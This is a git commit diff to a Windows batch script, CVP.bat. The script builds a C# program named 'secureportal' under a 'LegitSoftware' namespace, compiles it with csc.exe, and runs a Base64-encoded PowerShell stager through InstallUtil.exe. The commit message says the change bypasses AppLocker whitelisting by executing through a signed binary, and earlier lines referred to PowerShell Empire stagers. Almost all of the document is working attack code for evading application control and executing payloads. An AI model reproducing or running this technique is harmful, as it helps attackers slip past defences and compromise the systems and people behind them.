b04ca0ab4f3289aef2a4797d9899b39efb2d54e2
ac3lives <ac3lives@gmail.com>
2018-02-26 03:59:27 -0500

    Update CVP.bat
    Changed to using InstallUtil.exe for applocker whitelist bypassing (and executing via a signed exec). Also added a line to clean up the CS file if it already exists, as not to cause errors on consecutive payload runs.
    Finally, no longer should this be called as a batch file, but instead as a text file with "cmd < file.txt"

--- CVP.bat
+++ CVP.bat
@@ -1,16 +1,9 @@
 @echo off
 pushd %~dp0
 setlocal enableextensions
-for /f "tokens=*" %%a in (
-'where /r "C:\Windows\Microsoft.NET\Framework" "csc.exe"'
-) do (
-set myvar=%%a
-)
-for /f "tokens=*" %%b in (
-'where /r "C:\windows\assembly" "system.management.automation.dll"'
-) do (
-set myvar2=%%b
-)
+if exist secureportal.cs del secureportal.cs
+for /f "tokens=*" %a in ('where /r "C:\Windows\Microsoft.NET\Framework" "csc.exe"') do (set myvar=%a)
+for /f "tokens=*" %b in ('where /r "C:\windows\assembly" "system.management.automation.dll"') do (set myvar2=%b)
 echo using System; >> secureportal.cs
 echo using System.Text; >> secureportal.cs
 echo using System.Collections.ObjectModel; >> secureportal.cs
@@ -18,6 +11,17 @@ echo using System.Management.Automation; >> secureportal.cs
 echo using System.Management.Automation.Runspaces; >> secureportal.cs
 echo namespace LegitSoftware >> secureportal.cs
 echo { >> secureportal.cs
+   echo [System.ComponentModel.RunInstaller(true)] >> secureportal.cs
+   echo public class InstallUtil : System.Configuration.Install.Installer >> secureportal.cs
+   echo { >> secureportal.cs
+       echo public override void Install(System.Collections.IDictionary savedState) >> secureportal.cs
+       echo { >> secureportal.cs
+       echo } >> secureportal.cs
+       echo public override void Uninstall(System.Collections.IDictionary savedState) >> secureportal.cs
+       echo { >> secureportal.cs
+           echo Program.Main(); >> secureportal.cs
+       echo } >> secureportal.cs
+   echo } >> secureportal.cs
     echo class Program >> secureportal.cs
     echo { >> secureportal.cs
         echo static string RunPS(string cmd) >> secureportal.cs
@@ -37,14 +41,15 @@ echo { >> secureportal.cs
             echo } >> secureportal.cs
             echo return stringBuilder.ToString().Trim(); >> secureportal.cs
         echo } >> secureportal.cs
-        echo static void Main() >> secureportal.cs
+        echo public static void Main() >> secureportal.cs
         echo { >> secureportal.cs
-            echo string stager = "Insert your PowerShell Empire stager code here (Just the Base64 encoded part)"; >> secureportal.cs
+            echo string stager = "Insert your B64 encoded PowerShell string here"; >> secureportal.cs
             echo var decodedScript = Encoding.Unicode.GetString(Convert.FromBase64String(stager)); >> secureportal.cs
              echo string results = RunPS(decodedScript); >> secureportal.cs
         echo } >> secureportal.cs
     echo } >> secureportal.cs
 echo } >> secureportal.cs
+for /f "tokens=*" %c in ('where /r "C:\Windows\Microsoft.NET\Framework" "InstallUtil.exe"') do (set myvar3=%c)
 start /b /wait "" "%myvar%" /reference:%myvar2% secureportal.cs
-start /b secureportal.exe
+start /b %myvar3% /logfile= /LogToConsole=false /U secureportal.exe
 endlocal
